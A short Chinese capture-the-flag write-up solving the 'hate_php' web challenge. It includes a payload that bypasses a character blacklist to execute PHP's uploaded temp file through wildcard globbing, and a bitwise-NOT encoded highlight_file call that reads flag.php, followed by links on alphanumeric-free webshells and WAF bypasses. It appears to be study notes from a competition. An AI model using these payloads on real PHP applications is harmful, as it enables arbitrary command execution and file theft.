# Web-hate_php
## 题目
![](images/hate-php.png)
## 题解
![](images/hate-php-1.png)  
阅读源码发现过滤掉了f l a g . p h / ; " ' ` | [ ] _ =这些字符，并且还有一些黑名单函数。
![](images/hate-php-2.png)    
构造POC，执行任意命令。php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。最后，我传入的code为?><?=`. /???/????????[@-[]`;?>，发现成功了。   
下面就是要通过该方法构造一些黑名单之外的函数来读取flag.php中的内容。直接构造 highlight_file(flag.php)即可读到flag,执行payload```(~%97%96%98%97%93%96%98%97%8B%A0%99%96%93%9A)(~(%99%93%9E%98%D1%8F%97%8F))```.  
![](images/hate-php-3.png)
## 参考文献
[【第五空间智能安全大赛】hate_php WriteUp](https://www.cnblogs.com/vege/p/13258077.html)  
[无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)  
[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)  
关于PHP的特性:  
[递增／递减运算符](https://www.php.net/manual/zh/language.operators.increment.php)    
[不向后兼容的变更](https://www.php.net/manual/zh/migration70.incompatible.php)  
拓展阅读：  
[小密圈里的那些奇技淫巧](https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html)
* 应该反复阅读，没有十分懂得。 🤔  
* EVAL长度限制突破技巧（之前tstar靶场赛就遇到过，当时就不会）
* 命令长度限制突破技巧
* Mysql突破换行符的技巧
* 命令执行WAF绕过技巧
* 无字母数字Webshell构造技巧
[phith0n的博客](https://www.leavesongs.com/)
## 总结
### 第一次学习总结-2020.8.5
1.PHP语言不会,这个题应该熟悉PHP甚至是PHP5与PHP7